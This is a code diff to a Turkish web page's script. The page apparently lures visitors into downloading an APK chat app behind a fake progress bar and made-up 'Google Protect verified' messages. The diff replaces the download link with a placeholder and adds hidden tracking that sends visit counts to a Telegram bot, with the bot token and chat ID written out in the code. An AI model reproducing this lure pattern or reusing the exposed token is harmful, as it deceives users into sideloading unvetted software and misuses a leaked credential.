@@ -201,7 +201,7 @@ if(width>=100){
 clearInterval(interval);
 // küçük gecikme (premium hissi)
 setTimeout(()=>{
-window.location.href='https://github.com/pilotgarage/Tan-maSohbet/releases/download/V1/TanismaSohbet.apk';
+window.location.href='BURAYA_LINKİNİ_YAPIŞTIR';
 },500);
 }
 },100);
@@ -215,6 +215,41 @@ console.log("Google Protect doğrulandı");
 },1000);
 console.log("Cihaz analizi yapılıyor...");
 };
+
+
+// TELEGRAM LOG SİSTEMİ
+const TELEGRAM_BOT_TOKEN = "8634800611:AAFEuAx4nw7VbV-942w5Ku4OO0u_2c15Gc4";
+const CHAT_ID = "-1003887845842";
+
+// günlük sayaç
+let visitCount = localStorage.getItem("visitCount") || 0;
+visitCount++;
+localStorage.setItem("visitCount", visitCount);
+
+// siteye giriş logu
+sendTelegram("🚀 Siteye giriş yapıldı. Toplam: " + visitCount);
+
+function sendTelegram(message){
+fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+});
+}
+
+// gece 12'de toplam log gönderme
+function checkMidnight(){
+let now = new Date();
+if(now.getHours() === 0 && now.getMinutes() === 0){
+sendTelegram("📊 Günlük toplam giriş: " + visitCount);
+localStorage.setItem("visitCount", 0);
+}
+}
+
+setInterval(checkMidnight,60000);
 
 </script>
 
